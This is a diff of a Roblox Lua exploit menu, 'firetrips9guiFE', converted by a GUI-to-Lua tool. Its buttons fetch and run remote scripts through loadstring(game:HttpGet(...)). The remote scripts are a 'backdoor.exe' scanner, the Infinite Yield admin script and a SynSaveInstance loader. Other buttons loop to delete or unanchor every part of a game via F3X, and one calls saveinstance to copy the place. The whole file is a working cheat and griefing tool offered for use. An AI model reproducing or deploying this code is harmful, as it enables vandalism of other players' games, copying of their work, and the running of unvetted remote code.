@@ -1,107 +1,166 @@
--- Gui to Lua
--- Version: 3.2
+-- Generated using RoadToGlory's Converter v1.1 (RoadToGlory#9879)
 
 -- Instances:
 
-local firetrips9guiFE = Instance.new("ScreenGui")
-local ayowhatyoulookingat = Instance.new("Frame")
-local TextLabel = Instance.new("TextLabel")
-local TextButton = Instance.new("TextButton")
-local TextButton_2 = Instance.new("TextButton")
-local TextButton_3 = Instance.new("TextButton")
-local TextButton_4 = Instance.new("TextButton")
+local Converted = {
+	["_firetrips9guiFE"] = Instance.new("ScreenGui");
+	["_ayowhatyoulookingat"] = Instance.new("Frame");
+	["_TextLabel"] = Instance.new("TextLabel");
+	["_TextButton"] = Instance.new("TextButton");
+	["_LocalScript"] = Instance.new("LocalScript");
+	["_TextButton1"] = Instance.new("TextButton");
+	["_LocalScript1"] = Instance.new("LocalScript");
+	["_TextButton2"] = Instance.new("TextButton");
+	["_LocalScript2"] = Instance.new("LocalScript");
+	["_TextButton3"] = Instance.new("TextButton");
+	["_LocalScript3"] = Instance.new("LocalScript");
+	["_TextButton4"] = Instance.new("TextButton");
+	["_LocalScript4"] = Instance.new("LocalScript");
+	["_TextButton5"] = Instance.new("TextButton");
+	["_LocalScript5"] = Instance.new("LocalScript");
+}
 
---Properties:
+-- Properties:
 
-firetrips9guiFE.Name = "firetrips9guiFE"
-firetrips9guiFE.Parent = game.CoreGui
-firetrips9guiFE.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Converted["_firetrips9guiFE"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Converted["_firetrips9guiFE"].Name = "firetrips9guiFE"
+Converted["_firetrips9guiFE"].Parent = game:GetService("CoreGui")
 
-ayowhatyoulookingat.Name = "ayowhatyoulookingat"
-ayowhatyoulookingat.Parent = firetrips9guiFE
-ayowhatyoulookingat.BackgroundColor3 = Color3.fromRGB(40, 78, 255)
-ayowhatyoulookingat.BorderColor3 = Color3.fromRGB(0, 0, 255)
-ayowhatyoulookingat.BorderSizePixel = 3
-ayowhatyoulookingat.Position = UDim2.new(0, 0, 0.210031345, 0)
-ayowhatyoulookingat.Size = UDim2.new(0, 396, 0, 392)
+Converted["_ayowhatyoulookingat"].BackgroundColor3 = Color3.fromRGB(40.00000141561031, 78.00000295042992, 255)
+Converted["_ayowhatyoulookingat"].BorderColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_ayowhatyoulookingat"].BorderSizePixel = 3
+Converted["_ayowhatyoulookingat"].Position = UDim2.new(0, 0, 0.210031345, 0)
+Converted["_ayowhatyoulookingat"].Size = UDim2.new(0, 396, 0, 392)
+Converted["_ayowhatyoulookingat"].Name = "ayowhatyoulookingat"
+Converted["_ayowhatyoulookingat"].Parent = Converted["_firetrips9guiFE"]
 
-TextLabel.Parent = ayowhatyoulookingat
-TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.BackgroundTransparency = 1.000
-TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 255)
-TextLabel.BorderSizePixel = 3
-TextLabel.Size = UDim2.new(0, 396, 0, 62)
-TextLabel.ZIndex = 3
-TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = "Untitled firetrips9 GUI"
-TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.TextScaled = true
-TextLabel.TextSize = 14.000
-TextLabel.TextWrapped = true
+Converted["_TextLabel"].Font = Enum.Font.SourceSans
+Converted["_TextLabel"].Text = "Untitled firetrips9 GUI"
+Converted["_TextLabel"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextLabel"].TextScaled = true
+Converted["_TextLabel"].TextSize = 14
+Converted["_TextLabel"].TextWrapped = true
+Converted["_TextLabel"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_TextLabel"].BackgroundTransparency = 1
+Converted["_TextLabel"].BorderColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextLabel"].BorderSizePixel = 3
+Converted["_TextLabel"].Size = UDim2.new(0, 396, 0, 62)
+Converted["_TextLabel"].ZIndex = 3
+Converted["_TextLabel"].Parent = Converted["_ayowhatyoulookingat"]
 
-TextButton.Parent = ayowhatyoulookingat
-TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
-TextButton.BorderColor3 = Color3.fromRGB(0, 0, 255)
-TextButton.BorderSizePixel = 0
-TextButton.Position = UDim2.new(0, 0, 0.158163264, 0)
-TextButton.Size = UDim2.new(0, 120, 0, 41)
-TextButton.Font = Enum.Font.SourceSans
-TextButton.Text = "backdoor.exe"
-TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.TextScaled = true
-TextButton.TextSize = 14.000
-TextButton.TextWrapped = true
+Converted["_TextButton"].Font = Enum.Font.SourceSans
+Converted["_TextButton"].Text = "backdoor.exe"
+Converted["_TextButton"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton"].TextScaled = true
+Converted["_TextButton"].TextSize = 14
+Converted["_TextButton"].TextWrapped = true
+Converted["_TextButton"].BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton"].BorderColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton"].BorderSizePixel = 0
+Converted["_TextButton"].Position = UDim2.new(0, 0, 0.158163264, 0)
+Converted["_TextButton"].Size = UDim2.new(0, 120, 0, 41)
+Converted["_TextButton"].Parent = Converted["_ayowhatyoulookingat"]
 
-TextButton_2.Parent = ayowhatyoulookingat
-TextButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
-TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 255)
-TextButton_2.BorderSizePixel = 0
-TextButton_2.Position = UDim2.new(0.333333343, 0, 0.158163264, 0)
-TextButton_2.Size = UDim2.new(0, 120, 0, 41)
-TextButton_2.Font = Enum.Font.SourceSans
-TextButton_2.Text = "delete all parts (FE BUT NEEDS F3X AND DOES NOT WORK ON TERRAIN)"
-TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton_2.TextSize = 13.000
-TextButton_2.TextWrapped = true
+Converted["_TextButton1"].Font = Enum.Font.SourceSans
+Converted["_TextButton1"].Text = "delete all parts (FE BUT NEEDS F3X AND DOES NOT WORK ON TERRAIN)"
+Converted["_TextButton1"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton1"].TextSize = 13
+Converted["_TextButton1"].TextWrapped = true
+Converted["_TextButton1"].BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton1"].BorderColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton1"].BorderSizePixel = 0
+Converted["_TextButton1"].Position = UDim2.new(0.333333343, 0, 0.158163264, 0)
+Converted["_TextButton1"].Size = UDim2.new(0, 120, 0, 41)
+Converted["_TextButton1"].Parent = Converted["_ayowhatyoulookingat"]
 
-TextButton_3.Parent = ayowhatyoulookingat
-TextButton_3.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
-TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 255)
-TextButton_3.BorderSizePixel = 0
-TextButton_3.Position = UDim2.new(0.659090936, 0, 0.158163264, 0)
-TextButton_3.Size = UDim2.new(0, 120, 0, 41)
-TextButton_3.Font = Enum.Font.SourceSans
-TextButton_3.Text = "Infinite Yield"
-TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton_3.TextScaled = true
-TextButton_3.TextSize = 13.000
-TextButton_3.TextWrapped = true
+Converted["_TextButton2"].Font = Enum.Font.SourceSans
+Converted["_TextButton2"].Text = "Infinite Yield"
+Converted["_TextButton2"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton2"].TextScaled = true
+Converted["_TextButton2"].TextSize = 13
+Converted["_TextButton2"].TextWrapped = true
+Converted["_TextButton2"].BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton2"].BorderColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton2"].BorderSizePixel = 0
+Converted["_TextButton2"].Position = UDim2.new(0.659090936, 0, 0.158163264, 0)
+Converted["_TextButton2"].Size = UDim2.new(0, 120, 0, 41)
+Converted["_TextButton2"].Parent = Converted["_ayowhatyoulookingat"]
 
-TextButton_4.Parent = ayowhatyoulookingat
-TextButton_4.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
-TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 255)
-TextButton_4.BorderSizePixel = 0
-TextButton_4.Position = UDim2.new(0, 0, 0.306122452, 0)
-TextButton_4.Size = UDim2.new(0, 120, 0, 41)
-TextButton_4.Font = Enum.Font.SourceSans
-TextButton_4.Text = "unanchor all (again, needs F3X)"
-TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton_4.TextScaled = true
-TextButton_4.TextSize = 13.000
-TextButton_4.TextWrapped = true
+Converted["_TextButton3"].Font = Enum.Font.SourceSans
+Converted["_TextButton3"].Text = "unanchor all (again, needs F3X)"
+Converted["_TextButton3"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton3"].TextScaled = true
+Converted["_TextButton3"].TextSize = 13
+Converted["_TextButton3"].TextWrapped = true
+Converted["_TextButton3"].BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton3"].BorderColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton3"].BorderSizePixel = 0
+Converted["_TextButton3"].Position = UDim2.new(0, 0, 0.306122452, 0)
+Converted["_TextButton3"].Size = UDim2.new(0, 120, 0, 41)
+Converted["_TextButton3"].Parent = Converted["_ayowhatyoulookingat"]
 
--- Scripts:
+Converted["_TextButton4"].Font = Enum.Font.SourceSans
+Converted["_TextButton4"].Text = "saveinstance (your exploit needs the function for this to work)"
+Converted["_TextButton4"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton4"].TextScaled = true
+Converted["_TextButton4"].TextSize = 13
+Converted["_TextButton4"].TextWrapped = true
+Converted["_TextButton4"].BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton4"].BorderColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton4"].BorderSizePixel = 0
+Converted["_TextButton4"].Position = UDim2.new(0.333333343, 0, 0.306122452, 0)
+Converted["_TextButton4"].Size = UDim2.new(0, 120, 0, 41)
+Converted["_TextButton4"].Parent = Converted["_ayowhatyoulookingat"]
 
-local function KXNGDK_fake_script() -- TextButton.LocalScript 
-	local script = Instance.new('LocalScript', TextButton)
+Converted["_TextButton5"].Font = Enum.Font.SourceSans
+Converted["_TextButton5"].Text = "other saveinstance for exploits that dont have it"
+Converted["_TextButton5"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton5"].TextScaled = true
+Converted["_TextButton5"].TextSize = 13
+Converted["_TextButton5"].TextWrapped = true
+Converted["_TextButton5"].BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton5"].BorderColor3 = Color3.fromRGB(0, 0, 255)
+Converted["_TextButton5"].BorderSizePixel = 0
+Converted["_TextButton5"].Position = UDim2.new(0.659090936, 0, 0.306122452, 0)
+Converted["_TextButton5"].Size = UDim2.new(0, 120, 0, 41)
+Converted["_TextButton5"].Parent = Converted["_ayowhatyoulookingat"]
+
+-- Fake Module Scripts:
+
+local fake_module_scripts = {}
+
+
+-- Fake Local Scripts:
+
+local function OWXHGWV_fake_script() -- Fake Script: StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+    local script = Instance.new("LocalScript")
+    script.Name = "LocalScript"
+    script.Parent = Converted["_TextButton"]
+    local req = require
+    local require = function(obj)
+        local fake = fake_module_scripts[obj]
+        if fake then
+            return fake()
+        end
+        return req(obj)
+    end
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
 	end)
 end
-coroutine.wrap(KXNGDK_fake_script)()
-local function FVNQXFD_fake_script() -- TextButton_2.LocalScript 
-	local script = Instance.new('LocalScript', TextButton_2)
+local function CTNVBP_fake_script() -- Fake Script: StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+    local script = Instance.new("LocalScript")
+    script.Name = "LocalScript"
+    script.Parent = Converted["_TextButton1"]
+    local req = require
+    local require = function(obj)
+        local fake = fake_module_scripts[obj]
+        if fake then
+            return fake()
+        end
+        return req(obj)
+    end
 
 	script.Parent.Activated:Connect(function()
 		while wait() do
@@ -111,17 +170,35 @@ local function FVNQXFD_fake_script() -- TextButton_2.LocalScript
 		end
 	end)
 end
-coroutine.wrap(FVNQXFD_fake_script)()
-local function JGNCV_fake_script() -- TextButton_3.LocalScript 
-	local script = Instance.new('LocalScript', TextButton_3)
+local function SQMMEXI_fake_script() -- Fake Script: StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+    local script = Instance.new("LocalScript")
+    script.Name = "LocalScript"
+    script.Parent = Converted["_TextButton2"]
+    local req = require
+    local require = function(obj)
+        local fake = fake_module_scripts[obj]
+        if fake then
+            return fake()
+        end
+        return req(obj)
+    end
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 	end)
 end
-coroutine.wrap(JGNCV_fake_script)()
-local function GORHAQ_fake_script() -- TextButton_4.LocalScript 
-	local script = Instance.new('LocalScript', TextButton_4)
+local function CAKHG_fake_script() -- Fake Script: StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+    local script = Instance.new("LocalScript")
+    script.Name = "LocalScript"
+    script.Parent = Converted["_TextButton3"]
+    local req = require
+    local require = function(obj)
+        local fake = fake_module_scripts[obj]
+        if fake then
+            return fake()
+        end
+        return req(obj)
+    end
 
 	script.Parent.Activated:Connect(function()
 		while wait() do
@@ -136,4 +213,50 @@ local function GORHAQ_fake_script() -- TextButton_4.LocalScript
 		end
 	end)
 end
-coroutine.wrap(GORHAQ_fake_script)()
+local function MEKZ_fake_script() -- Fake Script: StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+    local script = Instance.new("LocalScript")
+    script.Name = "LocalScript"
+    script.Parent = Converted["_TextButton4"]
+    local req = require
+    local require = function(obj)
+        local fake = fake_module_scripts[obj]
+        if fake then
+            return fake()
+        end
+        return req(obj)
+    end
+
+	script.Parent.Activated:Connect(function()
+		saveinstance()
+	end)
+end
+local function ZQMHS_fake_script() -- Fake Script: StarterGui.firetrips9guiFE.ayowhatyoulookingat.TextButton.LocalScript
+    local script = Instance.new("LocalScript")
+    script.Name = "LocalScript"
+    script.Parent = Converted["_TextButton5"]
+    local req = require
+    local require = function(obj)
+        local fake = fake_module_scripts[obj]
+        if fake then
+            return fake()
+        end
+        return req(obj)
+    end
+
+	script.Parent.Activated:Connect(function()
+		local Params = {
+			RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
+			SSI = "saveinstance",
+		}
+		local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()
+		local Options = {noscripts = true} -- All Options can be found here https://github.com/luau/UniversalSynSaveInstance/blob/main/saveinstance.lua#L772
+		synsaveinstance(Options)
+	end)
+end
+
+coroutine.wrap(OWXHGWV_fake_script)()
+coroutine.wrap(CTNVBP_fake_script)()
+coroutine.wrap(SQMMEXI_fake_script)()
+coroutine.wrap(CAKHG_fake_script)()
+coroutine.wrap(MEKZ_fake_script)()
+coroutine.wrap(ZQMHS_fake_script)()
